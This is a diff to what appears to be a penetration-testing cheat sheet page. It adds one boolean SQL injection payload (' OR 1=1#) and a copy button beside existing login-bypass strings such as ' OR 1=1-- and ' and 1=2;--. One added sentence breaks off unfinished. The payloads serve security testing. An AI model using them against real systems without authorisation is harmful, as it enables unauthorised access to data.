@@ -45,7 +45,7 @@ fields, etc.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT001')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT002')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT003')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button>
 
-<b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>].	
+<b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>]. Also, it is 
 
 </details>
 <details>
@@ -55,13 +55,14 @@ fields, etc.
 If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean conditions are used.
 	
 <b>C1: TRUE </b><mark id="HDT01">' OR 1=1--</mark>
+<b>C4: TRUE </b><mark id="HDT04">' OR 1=1#</mark>
 <b>SAMPLE: </b><mark id="">' or "1"="1"#</mark>
 <b>SAMPLE: </b><mark id="">' or 1=1-- -</mark>
 <b>C2: TRUE </b><mark id="HDT02">' and 'a'='a--</mark>
 <b>C3: FALSE </b><mark id="HDT03">' and 1=2;--</mark><br>
 <b>SAMPLE: </b><mark id="">' and 1=1#</mark>
 	
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT04')">.C4.</button>
 
 </details>
 <details>
